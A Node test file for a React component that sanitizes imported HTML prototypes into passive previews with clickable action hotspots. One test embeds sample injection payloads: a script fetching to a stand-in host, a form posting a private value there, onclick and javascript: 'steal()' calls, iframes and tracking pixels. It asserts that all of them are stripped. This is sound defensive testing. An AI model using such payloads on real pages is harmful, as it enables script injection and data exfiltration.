import {mkdtemp,rm} from 'node:fs/promises';
import {tmpdir} from 'node:os';
import {join} from 'node:path';
import assert from 'node:assert/strict';
import { after, before, test } from 'node:test';
import { createServer } from 'vite';
import react from '@vitejs/plugin-react';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';

let testCache;
let server;
let SafePrototype;
let hotspotHelpers;
before(async () => {
 testCache=await mkdtemp(join(tmpdir(),'vks-web-test-'));
  server = await createServer({ configFile: false, cacheDir:testCache, optimizeDeps: {noDiscovery:true,include:[]}, plugins: [react()], server: { middlewareMode: true, hmr: false, ws: false } });
  ({ SafePrototype } = await server.ssrLoadModule('/src/components.tsx'));
  hotspotHelpers = await server.ssrLoadModule('/src/hotspots.ts');
});
after(async()=>{await server?.close();if(testCache)await rm(testCache,{recursive:true,force:true});});

const action = { id: 'action-1', stable_key: 'ui.invoice.submit', name: '确认开票' };
function render(html) {
  return renderToStaticMarkup(createElement(SafePrototype, { html, actions: [action], selected: action.id, onSelect() {} }));
}

test('full HTML documents including doctype produce a passive selectable preview', () => {
  const output = render('<!doctype html><html><head><title>原型</title></head><body><main><h1>缴费记录</h1><button data-vks-action="ui.invoice.submit">确认开票</button></main></body></html>');
  assert.match(output, /缴费记录/);
  assert.match(output, /选择动作：确认开票/);
  assert.match(output, /prototype-hotspot active/);
  assert.doesNotMatch(output, /doctype|<title|原型/i);
  assert.match(output, /^<div class="safe-prototype"><main>/);
});

test('imported script, resource, event, form and navigation attributes cannot reach the preview DOM', () => {
  const output = render('<main><script>fetch("https://outside.test/write")</script><style>@import "https://outside.test/style";</style><iframe src="https://outside.test"></iframe><img src="https://outside.test/pixel"><form action="https://outside.test/write"><input value="private-value"><button onclick="steal()" formaction="https://outside.test/write" data-vks-action="ui.invoice.submit">确认开票</button></form><a href="javascript:steal()">知识内容</a></main>');
  assert.match(output, /确认开票/);
  assert.match(output, /知识内容/);
  assert.doesNotMatch(output, /script|iframe|<img|<form|<input|onclick|formaction|outside\.test|steal|private-value|javascript:/i);
  assert.match(output, /type="button"/);
});

test('table structural whitespace is removed while cell text and passive controls remain', () => {
  const output = render(`<table>
  <thead>
    <tr>
      <th>字段</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>  开票金额  </td>
      <td><button data-vks-action="ui.invoice.submit">确认开票</button></td>
    </tr>
  </tbody>
</table>`);
  assert.doesNotMatch(output, /<(?:table|thead|tbody|tfoot|tr|colgroup)>\s/);
  assert.match(output, /<tbody><tr><td>  开票金额  <\/td>/);
  assert.match(output, /prototype-hotspot active/);
});

test('manual selector hotspots use a strict passive grammar and retain action identity',()=>{
  const selector='button#query.primary[data-testid="query"]';
  assert.equal(hotspotHelpers.matchesPassiveSelector(selector,'button',{id:'query',class:'other primary','data-testid':'query'}),true);
  assert.equal(hotspotHelpers.matchesPassiveSelector(selector,'button',{id:'other',class:'primary','data-testid':'query'}),false);
  for(const invalid of ['button .primary','button,div','button:hover','button:nth-child(1)','[data-id=""]','a > button','#a\\#b']) assert.equal(hotspotHelpers.parsePassiveSelector(invalid),null,invalid);
  const manual={...action,metadata:{selector}};
  const output=renderToStaticMarkup(createElement(SafePrototype,{html:'<button id="query" class="primary" data-testid="query">查询</button>',actions:[manual],onSelect(){}}));
  assert.match(output,/选择动作：确认开票/);assert.match(output,/prototype-hotspot/);
  const removed=renderToStaticMarkup(createElement(SafePrototype,{html:'<button id="query" class="primary" data-testid="query">查询</button>',actions:[{...manual,metadata:{...manual.metadata,status:'removed'}}],onSelect(){}}));
  assert.doesNotMatch(removed,/选择动作/);
});

test('hidden and inert prototype ancestors never expose targets or their text',()=>{
  const output=render('<main><div hidden><button data-vks-action="ui.invoice.submit">hidden-content</button></div><section aria-hidden="true">aria-hidden-content</section><div inert>inert-content</div><div style="visibility:collapse">collapsed-content</div><template>template-content</template><button data-vks-action="ui.invoice.submit">可见操作</button></main>');
  assert.match(output,/可见操作/);assert.doesNotMatch(output,/hidden-content|aria-hidden-content|inert-content|collapsed-content|template-content/);
});

test('hotspot rectangles use normalized coordinates and reject invalid or off-canvas bounds',()=>{
  const rect=hotspotHelpers.normalizedRect({x:0.7,y:0.8},{x:0.2,y:0.3});
  assert.equal(rect.x,0.2);assert.equal(rect.y,0.3);assert.ok(Math.abs(rect.width-0.5)<1e-8);assert.ok(Math.abs(rect.height-0.5)<1e-8);
  assert.equal(hotspotHelpers.validRect(rect),true);
  for(const invalid of [{x:0,y:0,width:0,height:0.2},{x:0.9,y:0,width:0.2,height:0.2},{x:-0.1,y:0,width:0.2,height:0.2},{x:0,y:NaN,width:0.2,height:0.2},null]) assert.equal(hotspotHelpers.validRect(invalid),false);
});
